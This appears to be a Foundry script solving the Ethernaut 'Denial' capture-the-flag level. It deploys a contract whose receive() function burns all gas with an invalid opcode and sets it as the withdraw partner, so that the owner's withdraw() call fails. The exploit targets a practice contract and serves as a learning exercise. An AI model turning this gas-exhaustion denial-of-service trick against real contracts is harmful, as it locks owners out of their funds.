/*
This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, 
and the transaction is of 1M gas or less) you will win this level.

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Denial} from "src/Denial.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract Hack {
    Denial public denial;

    constructor(Denial _denial) {
        denial = _denial;
    }

    receive() external payable {
        assembly {
            invalid()
        }
    }
}

contract DenialSolution is Script {
    Denial public denial = Denial(payable(0xF870FB9DF4efBfe0bA6B85061366F0ccA52ca323));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Current balance of Denial contract:", address(denial).balance);
        console.log("Current partner of Denial contract:", denial.partner());
        Hack hack = new Hack(denial);
        console.log("Current address of hack contract:", address(hack));
        denial.setWithdrawPartner(address(hack));
        console.log("Current partner of Denial contract:", denial.partner());
        // denial.withdraw();
        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
